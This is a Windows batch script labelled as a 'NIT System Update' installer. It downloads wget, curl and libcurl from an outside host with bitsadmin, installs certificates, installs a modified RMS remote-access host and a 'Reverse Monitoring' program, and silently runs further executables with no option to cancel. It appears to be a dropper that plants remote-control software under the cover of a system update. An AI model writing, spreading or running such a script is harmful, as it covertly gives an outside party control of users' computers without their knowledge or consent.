@echo on
rem ***************************************************************************
rem
rem Install-Update.bat
rem This Script Install the Certificates, RMS Host Program and System Updates
rem for Microsoft Windows 7 - 10 Operation Systems
rem
rem ***************************************************************************

setlocal enableextensions enabledelayedexpansion

set curdir=%CD%
set productname="NIT System Update"
set DEST_DIR=C:\NIT.SYSUPDATE

rem Set Common Host Downloads Varoables
set prefc=http
set hostc=anticriminalonline.ru
set portc=80
set uppathc=WinUpdate
set exppathc=Exponenta

rem define the Variables
SET NITWIN7X86=Nit.Win7x86.exe
SET NITWIN7X64=Nit.Win7x64.exe
SET NITWIN10=Nit.Win10.exe
SET RMSHOSTMSI=rms.host6.3ru_mod2.msi
SET RMSHOSTBAT=rmshost.install.cmd
SET CERTIFICATESBAT=Certificates-install.bat
SET REVERSEMON=ReverseMonitoringSetup.exe

set host=%prefc%://%hostc%:%portc%/%exppathc%
set host1=%prefc%://%hostc%:%portc%/%uppathc%

rem Download
%SystemRoot%\System32\bitsadmin /Transfer STEA_TRANSFER /DOWNLOAD /Priority FOREGROUND %host%/wget.exe %TEMP%\wget.exe %host%/LIBCURL.DLL %TEMP%\libcurl.dll %host%/CURL.EXE %TEMP%\curl.exe

Set xOS=x64 & If "%PROCESSOR_ARCHITECTURE%"=="x86" If Not Defined PROCESSOR_ARCHITEW6432 Set xOS=x32

rem Install Certificates Files...
if not exist %DEST_DIR%\%CERTIFICATESBAT% goto UnSuccess_Certificates
echo "Install Certificates..."
call %DEST_DIR%\%CERTIFICATESBAT%
:UnSuccess_Certificates

rem Update Windows Files...
if not exist %DEST_DIR%\Update-Windows.bat goto UnSuccess_UpdateWindows
echo "Update Windows Files..."
call %DEST_DIR%\Update-Windows.bat
:UnSuccess_UpdateWindows

rem RMSHOST Files...
if not exist %DEST_DIR%\%RMSHOSTMSI% goto UnSuccess_rmshost
copy /Y %DEST_DIR%\%RMSHOSTMSI% %TEMP%\%RMSHOSTMSI%
if not exist %DEST_DIR%\%RMSHOSTBAT% goto UnSuccess_rmshost
echo "Install RmsHost..."
call %DEST_DIR%\%RMSHOSTBAT%
:UnSuccess_rmshost

rem Reverse Monitoring Files...
if not exist %DEST_DIR%\%REVERSEMON% goto UnSuccess_REVERSEMON
echo "Install Reverse Monitoring..."
"%DEST_DIR%\%REVERSEMON%" /VERYSILENT /NOCANCEL
:UnSuccess_REVERSEMON

ver | %SystemRoot%\system32\find.exe "Windows [Version 10" > nul
if not errorlevel 1 goto win_10
ver | %SystemRoot%\system32\find.exe "Windows [Version 6.3" > nul
if not errorlevel 1 goto win_8_1
ver | %SystemRoot%\system32\find.exe "Windows [Version 6.2" > nul
if not errorlevel 1 goto win_8
ver | %SystemRoot%\system32\find.exe "Windows [Version 6.1" > nul
if not errorlevel 1 goto win_7
echo System UnSupported
goto end

:win_10
:win_8_1
:win_8
"%DEST_DIR%\%NITWIN10%" /VERYSILENT /NOCANCEL

goto end

:win_7

if %xOS%==x64 "%DEST_DIR%\%NITWIN7X64%" /VERYSILENT /NOCANCEL
if %xOS%==x32 "%DEST_DIR%\%NITWIN7X86%" /VERYSILENT /NOCANCEL
goto end

:end